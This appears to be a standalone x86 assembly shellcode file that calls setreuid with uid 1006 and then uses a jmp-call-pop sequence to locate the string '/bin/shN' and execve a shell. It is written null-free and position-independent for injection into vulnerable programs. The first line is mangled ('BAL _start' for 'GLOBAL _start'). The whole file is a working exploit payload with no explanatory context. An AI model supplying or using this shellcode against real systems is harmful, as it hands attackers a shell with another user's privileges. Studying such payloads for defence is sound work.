BAL _start

SECTION .data
_start:

    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    add eax, 70
    add bx, 1006
    add cx, 1006
    int 0x80

    jmp do_call

jmp_back:

    xor eax, eax
    add eax, 11
    pop ebx
    mov [ebx+7], byte ah
    xor ecx, ecx
    xor edx, edx
    int 0x80

do_call:

    call jmp_back

shell:

    db '/bin/shN'

